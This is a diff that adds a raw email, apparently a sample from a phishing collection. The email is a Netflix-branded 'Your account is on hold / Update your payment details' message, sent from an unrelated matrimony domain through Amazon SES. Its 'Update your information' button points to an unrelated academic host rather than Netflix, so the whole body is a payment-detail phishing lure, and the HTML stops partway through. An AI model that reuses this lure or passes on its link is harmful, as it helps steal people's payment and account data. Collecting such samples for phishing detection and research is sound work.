@@ -1,0 +1,143 @@
+Return-Path: 0100018452e88267-b228c453-0c85-4051-a781-e08500b370e3-000000@amazonses.com
+Delivered-To: jose@monkey.org
+X-FDA: 80107169562.50.C95527D
+Received: from a8-71.smtp-out.amazonses.com (a8-71.smtp-out.amazonses.com [54.240.8.71])
+	by imf28.b.hostedemail.com (Postfix) with ESMTP id D1FC718BFB4B1
+	for <jose@monkey.org>; Mon,  7 Nov 2022 16:24:40 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;
+	s=l75rptesq4yurwnx724qxj6d4edahive; d=magdalamatrimony.com;
+	t=1667838280;
+	h=MIME-Version:From:To:Date:Subject:Content-Type:Content-Transfer-Encoding:Message-ID;
+	bh=jCctJj3k94E8diYQI/QLxNn+DooYNAIAbqk+UVt0+Z4=;
+	b=QzF1OKEOfLC4px0MwcUtKBwyqyE8P6LU2pHbcFSdyCpl9I3XBKiYsxwHHPt47DzU
+	IeUZpMA9F7cu9Y2BsSmqLXkw36QehKKuzON2iSyApdylPBtwuBrnhwGXjOaWVyS2+xH
+	aZwupZ4Y7hGhMQztqp+oe/5jOf5N/BHEzFOBshVL+HHbdEPs1FKxffpt0rzhYD5Rf0s
+	QUAtpUyzwjnl3I9pf3r0+57GV5p425orl6LKX6EhoZjVVzLMvbie6pv4kebtmGGL/tx
+	2zkXuDMD4CEQuudnJlqrU5qwbxBvuoj0lT+STzjdlVUDh8KVNhjdWI0Q8zBQau2f+wM
+	7XnSd/BSfA==
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;
+	s=6gbrjpgwjskckoa6a5zn6fwqkn67xbtw; d=amazonses.com; t=1667838280;
+	h=MIME-Version:From:To:Date:Subject:Content-Type:Content-Transfer-Encoding:Message-ID:Feedback-ID;
+	bh=jCctJj3k94E8diYQI/QLxNn+DooYNAIAbqk+UVt0+Z4=;
+	b=RuDDlmZwug768eH4Av2MtousWlU7Lpd1k2EpzeqbviGFLHM+0JDvEv+TWFUsMZFW
+	lZOn3LCvXO+zfI2J4N7zP725bDi4qsun3/iThDxg9gbVrP4yBTiDwpk6ugeiiFxDTdH
+	Wwx7MteiCv85BHTKU29MnP3OF0y1ZeK4/0JWj/5o=
+MIME-Version: 1.0
+From: "Help Center" <no-reply@magdalamatrimony.com>
+To: jose@monkey.org
+Date: Mon, 7 Nov 2022 16:24:40 +0000
+Subject: We're having some trouble with your current billing information
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: quoted-printable
+Message-ID: <0100018452e88267-b228c453-0c85-4051-a781-e08500b370e3-000000@email.amazonses.com>
+Feedback-ID: 1.us-east-1.02bNs33WfR90/oIxarTPd4XN5P6s+OFpG5dpiCMBLcg=:AmazonSES
+X-SES-Outgoing: 2022.11.07-54.240.8.71
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1667838280;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=jCctJj3k94E8diYQI/QLxNn+DooYNAIAbqk+UVt0+Z4=;
+	b=koNTwoY4XRiTAXJAmiGR8D2qY6e3rXrW4eRlZ1k1frjG7LUFjCDQ680yyTdTOvO4YsjVyG
+	vjfa/SfOMYnnGsMpO2W3t+jiQ5p4k9RLwYXE1F0tTvjLsYPfCBmSXL+eRF1vJ8nuc1BvM3
+	icVztdcVf0iFr8j39PFzk/fFFyA5RDY=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1667838280; a=rsa-sha256;
+	cv=none;
+	b=joShk2Dt+3Ehy/xoQA9MyLsU2FsMer0KQ+5tG33bEVqOesOFAarj2WKoKTiI2tnBceMFJ0
+	/vsqurvYAHpEbgc8AMgFGoFhwFlYCXbDmP1KD7vaIvXvHdC1ssoSKTfByIHaot7MgINcY/
+	nQu2VCmXp3pyZwEDsGicSc95No4HeDg=
+ARC-Authentication-Results: i=1;
+	imf28.b.hostedemail.com;
+	dkim=pass header.d=magdalamatrimony.com header.s=l75rptesq4yurwnx724qxj6d4edahive header.b=QzF1OKEO;
+	dkim=pass header.d=amazonses.com header.s=6gbrjpgwjskckoa6a5zn6fwqkn67xbtw header.b=RuDDlmZw;
+	dmarc=none;
+	spf=pass (imf28.b.hostedemail.com: domain of 0100018452e88267-b228c453-0c85-4051-a781-e08500b370e3-000000@amazonses.com designates 54.240.8.71 as permitted sender) smtp.mailfrom=0100018452e88267-b228c453-0c85-4051-a781-e08500b370e3-000000@amazonses.com
+Authentication-Results: imf28.b.hostedemail.com;
+	dkim=pass header.d=magdalamatrimony.com header.s=l75rptesq4yurwnx724qxj6d4edahive header.b=QzF1OKEO;
+	dkim=pass header.d=amazonses.com header.s=6gbrjpgwjskckoa6a5zn6fwqkn67xbtw header.b=RuDDlmZw;
+	dmarc=none;
+	spf=pass (imf28.b.hostedemail.com: domain of 0100018452e88267-b228c453-0c85-4051-a781-e08500b370e3-000000@amazonses.com designates 54.240.8.71 as permitted sender) smtp.mailfrom=0100018452e88267-b228c453-0c85-4051-a781-e08500b370e3-000000@amazonses.com
+X-Spam-Status: No, score=1.05
+X-Rspamd-Server: rspam05
+X-Rspam-User: 
+X-Stat-Signature: tedzueu5hchskyxdjxr3e6n9b11o1oow
+X-Rspamd-Queue-Id: D1FC718BFB4B1
+X-HE-Tag: 1667838280-278615
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 191
+
+<table style=3D"background-color: #eaeaea; margin-top: 0;" border=
+=3D"0" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">=0A<tbo=
+dy>=0A<tr>=0A<td align=3D"center">=0A<table border=3D"0" width=3D=
+"600" cellspacing=3D"0" cellpadding=3D"0">=0A<tbody>=0A<tr>=0A<td=
+ style=3D"background-attachment: scroll; background-image: url('h=
+ttp://cdn.nflximg.com/us/email/hitch/netflix-crop-opacity.png'); =
+background-size: auto; background-repeat: no-repeat; background-c=
+olor: #ffffff;" bgcolor=3D"#ffffff">=0A<table border=3D"0" width=3D=
+"100%" cellspacing=3D"0" cellpadding=3D"0">=0A<tbody>=0A<tr>=0A<t=
+d style=3D"padding: 46px 0 0 0;" align=3D"center"><a style=3D"col=
+or: inherit;" href=3D"https://www.netflix.com/browse?lnktrk=3DEMP=
+&amp;g=3DE77C1A160B66237FCC574253CE1CA58C64550A7C&amp;lkid=3DURL_=
+HOME" target=3D"_blank" rel=3D"noreferrer noopener"> <img style=3D=
+"outline: currentcolor none medium; width: 145px; max-width: 280p=
+x; border: medium none currentcolor;" src=3D"https://assets.nflxe=
+xt.com/us/email/logo/newDesign/logo_v2.png" alt=3D"Netflix" align=
+=3D"middle" /> </a></td>=0A</tr>=0A<tr>=0A<td style=3D"padding: 4=
+5px 0 0 0; font-size: 0; line-height: 0;" height=3D"0">&nbsp;</td=
+>=0A</tr>=0A<tr>=0A<td style=3D"padding: 0 0 0 90px; margin: 0; b=
+ackground-color: #0071eb;">=0A<table style=3D"background-color: #=
+0071eb; color: #ffffff; font-family: Helvetica Neue, Helvetica, R=
+oboto, Segoe UI, sans-serif; font-size: 16px;" border=3D"0" width=
+=3D"100%" cellspacing=3D"0" cellpadding=3D"0">=0A<tbody>=0A<tr>=0A=
+<td style=3D"padding: 0 4px 0 0;" width=3D"19"><img style=3D"bord=
+er-collapse: collapse; display: block; outline: currentcolor none=
+ medium; border: medium none currentcolor;" src=3D"http://cdn.nfl=
+ximg.com/us/email/toaster/alert20.png" alt=3D"[!!]" width=3D"19" =
+data-inlineimagemanipulating=3D"true" /></td>=0A<td style=3D"padd=
+ing: 12px 0 12px 0; background-color: #0071eb; color: #ffffff; fo=
+nt-family: Helvetica Neue, Helvetica, Roboto, Segoe UI, sans-seri=
+f; font-size: 16px;">Your account is on hold.</td>=0A</tr>=0A</tb=
+ody>=0A</table>=0A</td>=0A</tr>=0A<tr>=0A<td style=3D"font-family=
+: Helvetica, Arial, sans; font-weight: bold; font-size: 32px; col=
+or: #221f1f; line-height: 40px; padding: 40px 90px 10px 90px;" al=
+ign=3D"left">Update your payment details</td>=0A</tr>=0A<tr>=0A<t=
+d style=3D"padding: 22px 90px 0 90px; font-family: Helvetica Neue=
+, Helvetica, Roboto, Segoe UI, sans-serif; font-size: 18px; line-=
+height: 24px; color: #221f1f;" align=3D"left">Dear Customer,</td>=
+=0A</tr>=0A<tr>=0A<td style=3D"padding: 22px 90px 0 90px; font-fa=
+mily: Helvetica Neue, Helvetica, Roboto, Segoe UI, sans-serif; fo=
+nt-size: 18px; line-height: 24px; color: #221f1f;" align=3D"left"=
+>We are having problems with your current billing information. We=
+ will try again, but in the meantime, you may want to update your=
+ payment details.</td>=0A</tr>=0A<tr>=0A<td style=3D"padding: 22p=
+x 90px 0 90px;">=0A<table style=3D"color: #ffffff; background-col=
+or: #e50914; border-radius: 2px;" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">=0A<tbody>=0A<tr>=0A<td style=3D"padding: 10px =
+16px; max-width: 265px; border-radius: 2px;"><a style=3D"font-siz=
+e: 16px; line-height: 24px; font-weight: normal; text-align: cent=
+er; text-decoration-line: none; text-decoration-style: solid; tex=
+t-decoration-color: currentcolor; font-family: Helvetica Neue, He=
+lvetica, Roboto, Segoe UI, sans-serif; letter-spacing: 0.025em; c=
+olor: inherit;" href=3D"https://docs.fmnc.ac.in/za/" target=3D"_b=
+lank" rel=3D"noreferrer noopener">Update your information</a></td=
+>=0A</tr>=0A</tbody>=0A</table>=0A</td>=0A</tr>=0A<tr>=0A<td styl=
+e=3D"padding: 22px 90px 0 90px; font-family: Helvetica Neue, Helv=
+etica, Roboto, Segoe UI, sans-serif; font-size: 18px; line-height=
+: 24px; color: #221f1f;" align=3D"left">Need help? We are here if=
+ you need it. Visit the Help Center or contact us now.</td>=0A</t=
+r>=0A<tr>=0A<td style=3D"padding: 22px 90px 0 90px; font-family: =
+Helvetica Neue, Helvetica, Roboto, Segoe UI, sans-serif; font-siz=
+e: 18px; line-height: 24px; color: #221f1f;" align=3D"left">&ndas=
+h;Your friends on Netflix</td>=0A</tr>=0A<tr>=0A<td style=3D"padd=
+ing: 30px 90px 0 90px;">=0A<table border=3D"0" width=3D"100%" cel=
+lspacing=3D"0" cellpadding=3D"0">=0A<tbody>=0A<tr>=0A<td style=3D=
+"font-family: Helvetica Neue, Helvetica, Roboto, Segoe UI, sans-s=
+erif; font-size: 15px; line-height: 17px; font-weight: bold; padd=
+ing: 17px 0px 0px; vertical-align: bottom; text-decoration-line: =
+none; text-decoration-style: solid; text-decoration-color: curren=
+tcolor;">&nbsp;</td>=0A
+
+
